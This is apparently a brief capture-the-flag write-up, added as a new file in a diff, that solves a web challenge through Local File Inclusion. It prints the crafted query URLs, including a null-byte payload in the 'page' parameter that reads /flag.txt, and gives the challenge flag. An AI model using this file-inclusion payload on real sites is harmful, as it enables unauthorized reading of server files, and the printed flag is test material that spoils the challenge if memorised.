@@ -1,0 +1,12 @@
+The website had LFI(Local File Inclusion) vulnerability.
+
+With adding flag in the get query:
+http://challenge.ctf.games:30510/index.php?page=flag
+It results in:
+The flag is at /flag.txt.
+
+Adding a null byte at the end gives the required flag
+http://challenge.ctf.games:30510/index.php?page=/flag.txt%00
+
+Flag:
+flag{lfi_just_needed_a_null_byte}
